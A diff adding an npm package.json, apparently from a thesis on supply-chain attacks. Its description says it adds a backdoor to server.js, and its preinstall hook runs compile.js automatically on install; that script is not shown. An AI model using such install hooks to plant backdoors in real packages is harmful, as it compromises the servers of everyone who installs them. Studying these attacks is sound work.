@@ -1,0 +1,11 @@
+{
+  "name": "@my/dependency",
+  "version": "1.0",
+  "description": "This file adds a backdoor to the server.js",
+  "main": "app.js",
+  "homepage": "TO-DO: mettere repo codice tesi",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1",
+    "preinstall": "node compile.js"
+  }
+}
